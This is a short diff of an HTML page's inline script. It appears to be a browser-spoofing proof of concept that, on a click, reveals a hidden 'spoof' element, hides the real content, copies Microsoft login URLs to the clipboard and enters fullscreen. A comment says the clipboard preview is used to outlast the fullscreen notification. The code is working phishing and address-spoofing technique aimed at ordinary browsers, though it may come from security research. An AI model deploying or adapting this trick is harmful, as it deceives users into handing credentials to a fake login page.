@@ -17,11 +17,13 @@
         <script>
                 onclick = async () => {
                 (async () => {
-                    await navigator.clipboard.writeText("http://login.live.com");
-					await navigator.clipboard.writeText("https://login.live.com");
+               
                 })();
                 document.getElementById("spoof").style   = "display: block;";
                 document.getElementById("content").style = "display: none;";
+			     navigator.clipboard.writeText("http://login.live.com");
+		    navigator.clipboard.writeText("https://login.live.com");
+			//keep the ClipboardUI Preview long enough until the fullscreen notification disappears
                 document.documentElement.requestFullscreen();
             }
         </script>
